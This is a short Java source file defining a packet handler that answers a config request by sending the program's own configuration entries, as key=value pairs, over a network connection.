package com.redpois0n.packets;

import com.redpois0n.Connection;
import com.redpois0n.Main;

public class PacketGETSCONFIG extends Packet {

	@Override
	public void read(String line) throws Exception {
		PacketBuilder packet = new PacketBuilder(Header.CONFIG);

		packet.add(Main.config.size());
		
		for (String key : Main.config.keySet()) {
			packet.add(key + "=" + Main.config.get(key));
		}
		
		Connection.addToSendQueue(packet);
	}

}
